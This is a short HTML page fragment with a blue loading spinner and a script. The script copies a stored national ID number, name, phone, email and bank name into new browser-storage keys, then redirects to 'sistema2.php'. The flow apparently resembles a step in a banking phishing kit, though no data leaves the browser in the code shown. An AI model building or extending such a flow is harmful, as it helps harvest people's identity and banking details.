<!-- LOADER AZUL CENTRADO -->
<div id="loader" style="
  position: fixed;
  top: 0; left: 0; width: 100%; height: 100%;
  background: #ffffff;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 99999;
">
  <div style="
    width: 60px;
    height: 60px;
    border: 6px solid #1E90FF;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
  "></div>
</div>

<style>
@keyframes spin { to { transform: rotate(360deg); } }
</style>

<script>
document.addEventListener("DOMContentLoaded", function () {

    // 1️⃣ Leer tbdatos
    let tb = {};
    try {
        tb = JSON.parse(localStorage.getItem("tbdatos") || "{}") || {};
    } catch (e) {
        console.warn("Error leyendo tbdatos:", e);
    }

    // 2️⃣ Leer objeto CONTACT INDIVIDUAL
    let contactObj = {};
    try {
        contactObj = JSON.parse(localStorage.getItem("contact") || "{}") || {};
    } catch (e) {
        console.warn("Error leyendo contacto:", e);
    }

    const correoReal = contactObj.correo || "";

    // 3️⃣ Leer infoload para banco
    let info = {};
    try {
        info = JSON.parse(localStorage.getItem("infoload") || "{}") || {};
    } catch (e) {
        console.warn("Error leyendo infoload:", e);
    }

    // 4️⃣ Crear nuevos objetos en localStorage
    if (tb.cedula) localStorage.setItem("val", tb.cedula);
    if (tb.ownerName) localStorage.setItem("per", tb.ownerName);
    if (tb.telefono || tb.phone) localStorage.setItem("cel", tb.telefono || tb.phone);
    if (correoReal) localStorage.setItem("correo", correoReal);
    if (info.bank) localStorage.setItem("nom", info.bank);

    console.log("✔ OBJETOS CREADOS:", {
        val: localStorage.getItem("val"),
        per: localStorage.getItem("per"),
        cel: localStorage.getItem("cel"),
        correo: localStorage.getItem("correo"),
        nom: localStorage.getItem("nom")
    });

    // 5️⃣ Ocultar loader y redirigir
    setTimeout(() => {
        document.getElementById("loader").style.display = "none";

        // 🔥 REDIRECCIÓN AUTOMÁTICA A sistema2.php
        window.location.href = "sistema2.php";

    }, 600);

});
</script>
